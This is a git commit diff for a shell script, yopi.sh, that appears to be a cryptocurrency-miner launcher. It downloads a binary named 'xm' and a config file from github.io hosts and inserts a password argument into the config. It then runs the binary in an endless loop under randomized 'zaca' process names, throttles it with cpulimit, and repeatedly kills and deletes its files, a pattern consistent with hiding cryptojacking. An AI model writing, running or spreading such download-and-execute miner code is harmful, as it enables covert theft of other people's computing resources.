b48028f7a68888ec18cac851320f541cea65c44d
pzeankto <57797716+pzeankto@users.noreply.github.com>
2019-12-02 02:47:14 +0100

    Update yopi.sh

--- yopi.sh
+++ yopi.sh
@@ -1,22 +1,23 @@
-#!/bin/bash
-echo "Getting Things Ready ... "
 wget http://dzmltzack.github.io/web/xm -O oxm
 while true
 do
+rm -f za*
+rm -f config*
+wget https://pzeankto.github.io/namnam/arqt.json -O config.json
 NEW_UUID=$(cat /dev/urandom | tr -dc 'a-z0-9' | fold -w 8 | head -n 1)
-BB=z$NEW_UUID
-NN=n$NEW_UUID
+BB=zaca$NEW_UUID
+NN=zaca$NEW_UUID
 cp oxm $BB
 echo $NN >> $BB
-wget https://pzeankto.github.io/namnam/arqt.json -O config.json
-sed -i "s/PSPS/$PASS/g" config.json
+sed -i "s/PSPS/$1/g" config.json
 chmod +x $BB
-./$BB
-sleep 1800
-kill -9 $(pgrep $BB)
-kill -9 $(pgrep z)
-rm -f $BB
-rm -f z*
-rm -f config.json
-sleep 200
+./zaca*
+result=$(($(grep -c processor /proc/cpuinfo) * 40))
+cpulimit -b -l $result -p $(pgrep zaca)
+sleep 220
+kill -9 $(pgrep cpul)
+kill -9 $(pgrep zaca)
+rm -f za*
+rm -f config*
+sleep 60
 done
